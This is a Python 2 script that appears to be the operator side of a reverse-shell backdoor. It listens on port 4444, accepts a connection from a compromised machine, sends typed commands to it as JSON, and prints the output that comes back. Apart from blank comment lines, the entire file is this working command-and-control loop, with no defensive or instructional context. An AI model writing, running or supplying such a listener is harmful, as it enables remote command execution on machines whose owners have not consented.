#!/usr/bin/env python

import socket
import json

class Listener:
    #
    def __init__(self,addr,port):
        #
        self.addr = addr
        #
        self.port = port
        #
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        #
        s.bind((addr,int(port)))
        #
        s.listen(3)
        #
        self.connection, address = s.accept()
        #
        print("[*] Connection from: %s " % (str(address)))

    def Receive(self):
        #
        json_data = ""
        #
        while(True):
            #
            try:
                #
                json_data = json_data + self.connection.recv(1024)
                #
                return json.loads(json_data)
                #
            except ValueError:
                #
                continue

    def Transmission(self,data):
        #
        json_data = json.dumps(data)
        #
        self.connection.send(json_data)

    def ExecuteCommand(self,cmd):
        #
        if(cmd[0] == "exit"):
            #
            self.Transmission(cmd)
            #
            self.connection.close()
            #
            exit()
            #
        self.Transmission(cmd)
        #
        return self.Receive()

    def run(self):
        #
        while(True):
            #
            cmd = raw_input("[*]>")
            #
            cmd = cmd.split(" ")
            #
            result = self.ExecuteCommand(cmd)
            #
            print(result)

if(__name__ == '__main__'):
    #
    B = Listener("0.0.0.0",4444)
    #
    B.run()
